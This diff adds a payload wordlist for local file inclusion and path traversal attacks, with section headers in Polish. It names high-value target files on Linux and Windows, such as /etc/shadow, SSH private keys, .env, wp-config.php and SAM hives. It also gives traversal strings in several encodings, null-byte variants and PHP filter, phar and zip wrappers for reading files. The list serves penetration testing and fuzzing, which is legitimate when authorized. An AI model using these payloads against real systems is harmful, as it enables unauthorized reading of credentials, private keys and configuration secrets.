@@ -1,0 +1,54 @@
+# === Linux — wysokowartościowe pliki ===
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/issue
+/etc/group
+/etc/hostname
+/etc/resolv.conf
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/status
+/proc/version
+/proc/cpuinfo
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+/var/log/auth.log
+/root/.bash_history
+/root/.ssh/id_rsa
+/home/user/.ssh/id_rsa
+/var/www/html/.env
+/var/www/html/wp-config.php
+
+# === Windows — wysokowartościowe pliki ===
+C:\Windows\win.ini
+C:\Windows\system32\drivers\etc\hosts
+C:\Windows\System32\config\SAM
+C:\Windows\repair\SAM
+C:\Windows\debug\NetSetup.LOG
+C:\inetpub\wwwroot\web.config
+C:\boot.ini
+C:\xampp\apache\conf\httpd.conf
+
+# === Path traversal — Linux ===
+../../../../etc/passwd
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+..%c0%af..%c0%afetc%c0%afpasswd
+
+# === Null byte (legacy PHP < 5.3.4) ===
+../../../etc/passwd%00
+../../../etc/passwd%00.jpg
+
+# === Absolute path bypass ===
+/etc/passwd
+file:///etc/passwd
+
+# === PHP wrappers — file read ===
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=/etc/passwd
+php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd
+phar://test.phar/file
+zip://test.zip#file
